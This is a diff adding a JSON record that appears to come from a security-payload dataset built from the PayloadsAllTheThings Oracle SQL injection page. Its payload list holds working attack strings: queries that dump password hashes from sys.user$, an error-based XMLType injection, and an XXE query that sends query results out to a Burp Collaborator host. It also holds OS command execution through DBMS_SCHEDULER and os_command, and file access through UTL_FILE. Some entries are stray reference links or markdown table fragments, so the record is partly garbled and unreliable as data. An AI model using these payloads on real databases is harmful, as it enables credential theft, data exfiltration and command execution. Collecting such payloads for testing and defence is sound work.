@@ -1,0 +1,27 @@
+{
+  "id": "sqli-12c63c2c39b0",
+  "category": "SQLI",
+  "title": "OracleSQL Injection",
+  "description": "# Oracle SQL Injection\n\n> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or \"inject\" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.\n\n## Summary\n\n* [Oracle SQL Default Databases](#oracle-sql-default-databases)\n",
+  "payloads": [
+    "| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |",
+    "| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |",
+    "SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'",
+    "SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'",
+    "| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\\|\\|CHR(58)\\|\\|'~'\\|\\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\\|\\|'~'\\|\\|CHR(62))) FROM DUAL) -- -` |",
+    "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |",
+    "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual",
+    "* [quentinhardy/odat](https://github.com/quentinhardy/odat) - ODAT (Oracle Database Attacking Tool)",
+    "exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');",
+    "SELECT os_command.exec_clob('<COMMAND>') cmd from dual",
+    "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)",
+    "utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
+    "utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
+    "* [ASDC12 - New and Improved Hacking Oracle From Web - Sumit \u201csid\u201d Siddharth - November 8, 2021](https://web.archive.org/web/20211108150011/https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)",
+    "* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/SQL Injection/OracleSQL Injection.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
